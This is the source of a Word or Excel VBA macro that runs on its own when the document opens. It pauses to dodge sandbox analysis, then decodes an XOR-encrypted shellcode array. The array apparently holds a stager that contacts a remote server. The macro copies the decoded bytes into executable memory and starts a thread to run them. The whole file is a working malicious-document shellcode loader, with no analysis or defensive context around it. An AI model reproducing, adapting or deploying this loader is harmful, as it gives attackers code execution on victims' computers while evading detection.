Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr
Private Declare PtrSafe Function Sleep Lib "KERNEL32" (ByVal mili As Long) As Long

Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim buf As Variant
    Dim addr As LongPtr
    Dim counter As Long
    Dim data As Long
    Dim res As LongPtr
    Dim t1 As Date
    Dim t2 As Date
    Dim time As Long

        t1 = Now()
        Sleep (2000)
        t2 = Now()
        time = DateDiff("s", t1, t2)

        If time < 2 Then
        Exit Sub
        End If
        
' Paste the encrypted shellcode from the EncryptVBA

    buf = Array(6, 18, 117, 250, 250, 250, 154, 115, 31, 203, 40, 158, 113, 168, 202, 113, 168, 246, 113, 168, 238, 245, 77, 176, 220, 203, 5, 113, 136, 210, 203, 58, 86, 198, 155, 134, 248, 214, 218, 59, 53, 247, 251, 61, 179, 143, 21, 168, 113, 168, _
234, 113, 184, 198, 251, 42, 113, 186, 130, 173, 127, 58, 142, 182, 251, 42, 113, 162, 218, 251, 41, 170, 113, 178, 226, 127, 51, 142, 198, 203, 5, 179, 113, 206, 113, 251, 44, 203, 58, 86, 59, 53, 247, 251, 61, 194, 26, 143, 14, 249, _
135, 2, 193, 135, 222, 143, 26, 162, 113, 162, 222, 251, 41, 156, 113, 246, 177, 113, 162, 230, 251, 41, 113, 254, 113, 251, 42, 115, 190, 222, 222, 161, 161, 155, 163, 160, 171, 5, 26, 162, 165, 160, 113, 232, 19, 122, 5, 5, 5, 167, _
146, 148, 159, 142, 250, 146, 141, 147, 148, 147, 174, 146, 182, 141, 220, 253, 5, 47, 203, 33, 169, 169, 169, 169, 169, 18, 137, 250, 250, 250, 183, 149, 128, 147, 150, 150, 155, 213, 207, 212, 202, 218, 210, 183, 155, 153, 147, 148, 142, 149, _
137, 146, 193, 218, 179, 148, 142, 159, 150, 218, 183, 155, 153, 218, 181, 169, 218, 162, 218, 203, 206, 165, 205, 211, 218, 187, 138, 138, 150, 159, 173, 159, 152, 177, 147, 142, 213, 204, 202, 207, 212, 203, 212, 203, 207, 218, 210, 177, 178, 174, _
183, 182, 214, 218, 150, 147, 145, 159, 218, 189, 159, 153, 145, 149, 211, 218, 172, 159, 136, 137, 147, 149, 148, 213, 203, 194, 212, 202, 218, 169, 155, 156, 155, 136, 147, 213, 204, 202, 207, 212, 203, 212, 203, 207, 250, 146, 192, 172, 131, 93, _
5, 47, 169, 169, 144, 249, 169, 169, 146, 65, 251, 250, 250, 18, 114, 251, 250, 250, 213, 202, 142, 201, 183, 147, 143, 179, 203, 190, 176, 206, 195, 158, 174, 130, 202, 173, 137, 149, 155, 176, 157, 200, 178, 176, 215, 163, 141, 203, 151, 136, _
131, 189, 184, 146, 169, 162, 170, 177, 181, 138, 182, 158, 141, 157, 180, 131, 163, 149, 142, 191, 159, 131, 156, 147, 128, 182, 156, 160, 172, 158, 207, 148, 207, 158, 141, 179, 168, 131, 184, 153, 150, 177, 189, 128, 162, 142, 138, 131, 162, 180, _
189, 202, 139, 185, 172, 177, 145, 171, 178, 165, 159, 206, 176, 201, 206, 143, 158, 204, 175, 174, 174, 149, 187, 145, 143, 174, 160, 148, 159, 176, 190, 156, 136, 162, 181, 174, 185, 150, 131, 152, 162, 178, 156, 185, 207, 176, 215, 149, 136, 141, _
200, 176, 156, 148, 184, 146, 179, 155, 149, 151, 162, 207, 190, 153, 153, 163, 165, 180, 165, 200, 160, 162, 178, 200, 160, 162, 144, 174, 142, 155, 204, 138, 157, 173, 152, 148, 141, 155, 188, 155, 165, 165, 157, 128, 180, 136, 207, 162, 185, 158, _
178, 168, 174, 206, 187, 181, 176, 175, 142, 130, 179, 183, 181, 130, 144, 169, 159, 165, 187, 176, 157, 188, 188, 195, 168, 137, 170, 188, 207, 147, 207, 147, 152, 153, 147, 194, 145, 147, 201, 143, 131, 176, 202, 171, 165, 194, 190, 185, 157, 163, _
151, 147, 184, 191, 185, 148, 165, 169, 195, 128, 170, 203, 160, 144, 183, 169, 250, 170, 146, 173, 115, 101, 60, 5, 47, 115, 60, 169, 146, 250, 200, 18, 126, 169, 169, 169, 173, 169, 172, 146, 17, 175, 212, 193, 5, 47, 108, 144, 240, 165, _
146, 122, 201, 250, 250, 115, 26, 144, 254, 170, 144, 229, 172, 146, 143, 188, 100, 124, 5, 47, 169, 169, 169, 169, 172, 146, 215, 252, 226, 129, 5, 47, 127, 58, 143, 238, 146, 114, 233, 250, 250, 146, 190, 10, 207, 26, 5, 47, 181, 143, _
55, 18, 177, 250, 250, 250, 144, 186, 146, 250, 234, 250, 250, 146, 250, 250, 186, 250, 169, 146, 162, 94, 169, 31, 5, 47, 105, 169, 169, 115, 29, 173, 146, 250, 218, 250, 250, 169, 172, 146, 232, 108, 115, 24, 5, 47, 127, 58, 142, 53, _
113, 253, 251, 57, 127, 58, 143, 31, 162, 57, 165, 18, 145, 5, 5, 5, 203, 195, 200, 212, 203, 204, 194, 212, 206, 207, 212, 203, 205, 205, 250, 65, 26, 231, 208, 240, 146, 92, 111, 71, 103, 5, 47, 198, 252, 134, 240, 122, 1, 26, _
143, 255, 65, 189, 233, 136, 149, 144, 250, 169, 5, 47)

		For i = 0 To UBound(buf)
        buf(i) = buf(i) Xor 250
    Next i
    
    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
      
    For counter = LBound(buf) To UBound(buf)
        data = buf(counter)
        res = RtlMoveMemory(addr + counter, data, 1)
    Next counter
    res = CreateThread(0, 0, addr, 0, 0, 0)
    
End Sub
